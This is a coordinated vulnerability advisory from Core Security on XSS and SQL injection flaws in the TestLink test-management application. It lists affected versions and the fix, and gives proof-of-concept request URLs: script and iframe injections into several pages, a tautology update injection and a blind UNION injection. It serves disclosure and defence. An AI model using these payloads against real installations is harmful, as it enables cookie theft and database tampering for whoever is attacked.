Multiple XSS and Injection Vulnerabilities in TestLink Test Management
and Execution System
 
 
1. *Advisory Information*
 
Title: Multiple XSS and Injection Vulnerabilities in TestLink Test
Management and Execution System
Advisory Id: CORE-2009-1013
Advisory URL:
http://www.coresecurity.com/content/testlink-multiple-injection-vulnerabilities
Date published: 2009-12-09
Date of last update: 2009-12-09
Vendors contacted: TestLink Community
Release mode: Coordinated release
 
 
2. *Vulnerability Information*
 
Class: Cross site scripting [CWE-79], SQL injection [CWE-89]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 37258
CVE Name: CVE-2009-4237, CVE-2009-4238
 
 
3. *Vulnerability Description*
 
 Multiple injection (both XSS [1] and SQL) vulnerabilities have been
discovered in Testlink [2], a widely used test-case management
application written in PHP [3]. One of the XSS vulnerabilities,
discovered in its login screen, can be exploited without an
authenticated session.
 
 
4. *Vulnerable packages*
 
   . TestLink 1.8.0
   . TestLink 1.8.1
   . TestLink 1.8.2
   . TestLink 1.8.3
   . TestLink 1.8.4
   . Older versions are probably affected too, but they were not checked.
 
 
5. *Non-vulnerable packages*
 
   . TestLink 1.8.5
 
 
6. *Solutions and Workarounds*
 
 Upgrade to a non-vulnerable version, such as 1.8.5. TestLink features
the option to upgrade a current installation in its install scripts.
 
 
7. *Credits*
 
 These vulnerabilities were discovered and researched by Pablo
Annetta, from Core Security Technologies, during Core Bugweek 2009 as
a member of the "Los Herederos de Don Pablo (HDP)" team.
 
 
8. *Technical Description / Proof of Concept Code*
 
because the logic for the sanitization of user input is rudimentary.
Each script sanitizes its own input, instead of abstracting this task
to another layer of logic. Often only slashes are stripped, but html
entities are almost never escaped.
 
 The only vulnerability in this report that can be exploited without
an authenticated session is a XSS vulnerability in Testlink's login
page 'login.php'. This script gets a parameter named 'req', which is
used by the application to set the next request to be made. All
parameters are initialized in the 'init_args' function which doesn't
sanitize its arguments appropriately as seen below.
 
/-----
function init_args()
{
    $args = new stdClass();
    $_REQUEST = strings_stripSlashes($_REQUEST);
     
    $args->note = isset($_REQUEST['note']) ? $_REQUEST['note'] : null;
    $args->login = isset($_REQUEST['tl_login']) ?
trim($_REQUEST['tl_login']) : null;
    $args->pwd = isset($_REQUEST['tl_password']) ?
$_REQUEST['tl_password'] : null;
 
    $args->reqURI = isset($_REQUEST['req']) ? $_REQUEST['req'] : null;
strlen($_REQUEST['reqURI'])) ? $_REQUEST['reqURI'] : null;
  
    return $args;
}

 This vulnerability can be verified by issuing the following request
to a Testlink installation on localhost:
 
/-----
http://127.0.0.1/testlink/login.php?req=";><iframe src
="http://www.coresecurity.com/content/xxxx"; width="100%"
height="300"></iframe>
- -----/
 
 
 Other XSS vulnerabilities on different scripts can be exploited with
an authenticated session. Proof of concept code follows:
 
/-----
http://127.0.0.1/testlink/lib/general/staticPage.php?key=";><script>alert(document.cookie)</script>
 
http://127.0.0.1/testlink/lib/attachments/attachmentupload.php?id=1&tableName='<script>alert(document.cookie)</script>
http://127.0.0.1/testlink/lib/events/eventviewer.php?startDate=";<script>alert(document.cookie)</script>
http://127.0.0.1/testlink/lib/events/eventviewer.php?endDate=";<script>alert(document.cookie)</script>
http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=";<script>alert(document.cookie)</script>
- -----/
 
 
 There are more XSS attacks that can be executed with *an
authenticated session* on installations that have *at least one test
plan created*. Most of these are due to an 'echo' statement in
TestLink's database functions that directly outputs SQL errors back to
the browser without escaping html entities. This can be found on line
181 of 'testlink/lib/functions/database.class.php', where some
function such as 'htmlspecialchars' should be called on '
$this->error($p_query)' and '$message'. A templating engine (TestLink
uses Smarty for many other tasks) could also be used to output these
errors.
 
/-----
if ( !$t_result ) {
    echo "ERROR ON exec_query() - database.class.php <br>" .
$this->error($p_query) . "<br>";
  echo "<br> THE MESSAGE :: $message. "<br>";
    return false;
} else {
    return $t_result;
}

 This proof of concept code triggers the vulnerabilities described above:
 
/-----
http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&expected_results='<script>alert(document.cookie)</script>
http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&name=<script>alert(document.cookie)</script>
http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&steps=<script>alert(document.cookie)</script>
http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='<script>alert(document.cookie)</script>
- -----/
 
 More XSS vulnerabilities can also be triggered because of the problem
described above, but also because another independent XSS exists on
'resultsMoreBuilds_buildReport.php' caused by not escaping the
'search_notes_string', by issuing this request (also when logged into
an installation with a Test Plan created):
 
/-----
http://127.0.0.1/testlink/lib/results/resultsMoreBuilds_buildReport.php?report_type=0&display_query_params=1&search_notes_string=</td><script>alert(document.cookie)</script>
- -----/
 
 
 With an authenticated session, the following SQL injection bug can
also be exploited.
 
 In 'http://127.0.0.1/testlink/lib/general/navBar.php', filling in the
'Test Case ID' field with 'TC-1 or 1 = 1 update tcversions set summary
= '</td><script>alert(document.cookie)</script><td>'' results in
reflected HTML.
 
 Also with an authenticated session the following blind SQL injection
exists
 
/-----
http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=1,1)%20union%20SELECT%20id%20FROM%20testplans%20%23
------/
